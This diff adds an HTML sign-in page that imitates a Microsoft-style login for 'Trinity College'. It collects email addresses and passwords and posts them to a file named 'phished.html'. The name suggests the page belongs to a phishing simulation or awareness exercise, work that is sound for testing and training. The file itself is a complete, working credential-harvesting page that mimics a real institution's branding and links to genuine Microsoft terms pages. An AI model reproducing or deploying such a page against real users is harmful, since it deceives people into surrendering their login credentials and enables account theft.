@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in to your Trinity Account</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in with your Trinity Account" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="../reset.css" rel="stylesheet" />
+    <link href="trinity.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="trinity-wrap">
+
+      <!-- form center container -->
+      <main class="trinity-container">
+
+        <!-- form object -->
+        <form class="trinity-form" action="../phished.html" method="POST" autocomplete="off">
+
+          <!-- form logo -->
+          <div class="trinity-logo">
+            <img src="trinity-logo.jpg" alt="Trinity College" />
+          </div>
+
+          <!-- email selected heading -->
+          <div class="trinity-welcome fade-in">
+            <button type="button"><img src="arrow.png" alt="Back" /></button>
+            <span>...</span>
+          </div>
+
+          <!-- email slide -->
+          <div class="trinity-email trinity-slide slide-right">
+            <h2>Sign in</h2>
+            <div class="trinity-input">
+              <input type="email" name="_email" placeholder="Email address" value="" />
+            </div>
+            <div class="trinity-options">
+              <a href="#">Sign-in options</a>
+            </div>
+            <div class="trinity-action">
+              <button type="submit">Next</button>
+            </div>
+          </div>
+
+          <!-- hidden password input -->
+          <div class="trinity-password trinity-slide slide-left hidden">
+            <h2>Enter password</h2>
+            <div class="trinity-input">
+              <input type="password" name="_password" placeholder="Password" value="" />
+            </div>
+            <div class="trinity-remember">
+              <input type="checkbox" />
+              <span>Keep me signed in</span>
+            </div>
+            <div class="trinity-forgot">
+              <a href="#">Forgot my password</a>
+            </div>
+            <div class="trinity-action">
+              <button type="submit">Sign in</button>
+            </div>
+          </div>
+
+        </form>
+
+        <div class="trinity-help">
+          If you need assistance accessing your account, please contact the
+          <a href="#">IT Service Desk E-Mail</a>.
+        </div>
+
+      </main>
+
+    </section>
+
+    <!-- form footer links -->
+    <footer class="trinity-footer">
+      <div>
+        <span>©2019 Trinity</span>
+        <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse">Terms of use</a>
+        <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement">Privacy &amp; cookies</a>
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="trinity.js"></script>
+
+  </body>
+</html>
